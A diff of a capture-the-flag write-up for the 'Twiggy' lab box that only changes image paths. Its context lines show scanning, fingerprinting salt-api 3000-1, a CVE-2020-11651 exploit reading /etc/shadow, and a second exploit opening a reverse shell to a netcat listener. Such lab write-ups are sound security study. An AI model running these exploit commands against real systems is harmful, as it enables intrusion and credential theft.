@@ -36,11 +36,11 @@ graph TD
 
 - `nmap -sS -Pn -n -T4 -p- --open 192.168.177.62`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled.png)
     
 - `nmap -sVC -Pn -n -p 22,53,80,4505,4506,8000 192.168.177.62`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%201.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%201.png)
     
 
 ## Enumeration
@@ -51,36 +51,36 @@ graph TD
 
 - [http://192.168.177.62:8000/](http://192.168.177.62:8000/) → *This looks like some clients for the webserver.*
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%202.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%202.png)
     
 
 So i decided to try access some url’s that are mistaken on purpose.
 
 - [http://192.168.177.62:8000/local](http://192.168.177.62:8000/local) → *Powered by* CherryPy 5.6.0
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%203.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%203.png)
     
 
 - `feroxbuster -u http://192.168.177.62:8000 -k -C 404,403,500  --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php -t 100`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%204.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%204.png)
     
 
 - [http://192.168.177.62:8000/login](http://192.168.177.62:8000/login) → Says “Please log in”
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%205.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%205.png)
     
 
 - `curl -X POST http://192.168.177.62:8000/login -d "username=admin&password=admin"` → Unauthorized
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%206.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%206.png)
     
 
 - Intercepting the login request in the burp 
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%207.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%207.png)
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%208.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%208.png)
     
 - Verifying the response of the requisition
     
@@ -103,14 +103,14 @@ So i decided to try access some url’s that are mistaken on purpose.
     {"status": null, "return": "Please log in"}
     ```
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%209.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%209.png)
     
 
 I also can get the same answer with this command:
 
 - `curl -v -X GET http://192.168.177.62:8000/login`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2010.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2010.png)
     
 
 It have the **`X-Upstream: salt-api/3000-1`.**
@@ -124,14 +124,14 @@ That information about the requisition, indicates the request was handled upstre
 
 - Search in the google for `salt-api/3000-1` → There’s an exploit for SaltStack 3000.1
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2011.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2011.png)
     
 
 - [https://github.com/jasperla/CVE-2020-11651-poc/tree/master](https://github.com/jasperla/CVE-2020-11651-poc/tree/master)
 
 - `python3 exploit.py -m 192.168.177.62 -r /etc/shadow`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2012.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2012.png)
     
 
 Once that i wanted an reverse shell, this script wasn’t promisor, so i found this one:
@@ -140,14 +140,14 @@ Once that i wanted an reverse shell, this script wasn’t promisor, so i found t
 
 - `python3 exp.py --master 192.168.177.62 -lh 192.168.45.227 -lp 80`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2013.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2013.png)
     
 
 - `rlwrap nc -lvnp 80`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2014.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2014.png)
     
 
 - `flag`
     
-    ![Untitled](../assets/img/oscp/Twiggy/Untitled%2015.png)
+    ![Untitled](../assets/img/provingrounds/Twiggy/Untitled%2015.png)
